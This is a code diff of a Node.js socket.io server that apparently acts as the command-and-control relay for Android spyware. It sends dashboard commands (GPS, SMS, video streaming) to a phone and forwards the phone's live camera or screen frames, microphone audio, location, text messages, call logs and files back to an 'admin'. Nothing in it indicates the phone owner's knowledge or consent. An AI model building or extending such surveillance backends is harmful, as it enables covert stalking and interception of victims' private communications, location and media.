@@ -1,59 +1,87 @@
 const express = require('express');
 const http = require('http');
-const path = require('path'); 
-const { Server } = require("socket.io");
+const { Server } = require('socket.io');
+const path = require('path');
 
 const app = express();
 const server = http.createServer(app);
-
-// Handle large image transfers (100MB buffer)
 const io = new Server(server, {
-    maxHttpBufferSize: 1e8,
-    cors: { origin: "*", methods: ["GET", "POST"] }
+    maxHttpBufferSize: 1e8 // Increased to 100MB for file transfers
 });
 
-const PORT = process.env.PORT || 3000;
+app.use(express.static(path.join(__dirname, 'public')));
 
-// DIRECTORY FIX: Tell Express where your public folder is
-const publicPath = path.join(__dirname, 'public');
+// Store active connections
+let deviceSocket = null;
+let adminSocket = null;
 
-// Serve all static files from /public
-app.use(express.static(publicPath));
+io.on('connection', (socket) => {
+    console.log('New connection:', socket.id);
 
-// ROUTE FIX: Serve index.html from inside /public
-app.get('/', (req, res) => {
-    const indexPath = path.join(publicPath, 'index.html');
-    res.sendFile(indexPath, (err) => {
-        if (err) {
-            console.error("ERROR: Cannot find index.html at " + indexPath);
-            res.status(404).send("Error: index.html not found in public folder");
+    // Identify if the connection is the Android device or the Dashboard
+    socket.on('register', (role) => {
+        if (role === 'device') {
+            deviceSocket = socket;
+            console.log('Android Device Connected');
+        } else if (role === 'admin') {
+            adminSocket = socket;
+            console.log('Admin Dashboard Connected');
         }
+    });
+
+    // 1. FORWARD COMMANDS: Dashboard -> Android Device
+    // Handles commands like 'get-gps', 'get-sms', 'stream:0:video'
+    socket.on('phone-execute', (cmd) => {
+        if (deviceSocket) {
+            console.log('Sending command to device:', cmd);
+            deviceSocket.emit('phone-execute', cmd);
+        }
+    });
+
+    // 2. FORWARD DATA: Android Device -> Dashboard
+    
+    // Live Camera/Screen frames
+    socket.on('data-stream', (base64Data) => {
+        if (adminSocket) adminSocket.emit('data-stream', base64Data);
+    });
+
+    // Live Mic Audio
+    socket.on('audio-stream', (base64Audio) => {
+        if (adminSocket) adminSocket.emit('audio-stream', base64Audio);
+    });
+
+    // GPS Updates
+    socket.on('location-update', (data) => {
+        if (adminSocket) adminSocket.emit('location-update', data);
+    });
+
+    // SMS and Call Logs
+    socket.on('sms-data', (data) => {
+        if (adminSocket) adminSocket.emit('sms-data', data);
+    });
+    
+    socket.on('call-data', (data) => {
+        if (adminSocket) adminSocket.emit('call-data', data);
+    });
+
+    // File Explorer Data
+    socket.on('file-data', (data) => {
+        if (adminSocket) adminSocket.emit('file-data', data);
+    });
+
+    // File Downloads
+    socket.on('file-download-ready', (data) => {
+        if (adminSocket) adminSocket.emit('file-download-ready', data);
+    });
+
+    socket.on('disconnect', () => {
+        if (socket === deviceSocket) deviceSocket = null;
+        if (socket === adminSocket) adminSocket = null;
+        console.log('User disconnected');
     });
 });
 
-// Socket.io Broadcaster
-io.on('connection', (socket) => {
-    console.log('Connected:', socket.id);
-
-    socket.on('phone-execute', (cmd) => io.emit('phone-execute', cmd));
-    socket.on('battery-update', (data) => io.emit('battery-update', data));
-    socket.on('location-update', (data) => io.emit('location-update', data));
-    socket.on('sms-data', (data) => io.emit('sms-data', data));
-    socket.on('call-data', (data) => io.emit('call-data', data));
-    socket.on('data-stream', (data) => io.emit('data-stream', data));
-    socket.on('file-download-ready', (data) => {
-    io.emit('file-download-ready', data);
-    socket.on('notif-data', (data) => {
-    io.emit('notif-data', data);
-});
-});
-
-    socket.on('disconnect', () => console.log('User disconnected'));
-});
-
-server.listen(PORT, '0.0.0.0', () => {
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
-    console.log(`Looking for index.html in: ${path.join(__dirname, 'public')}`);
 });
-
-
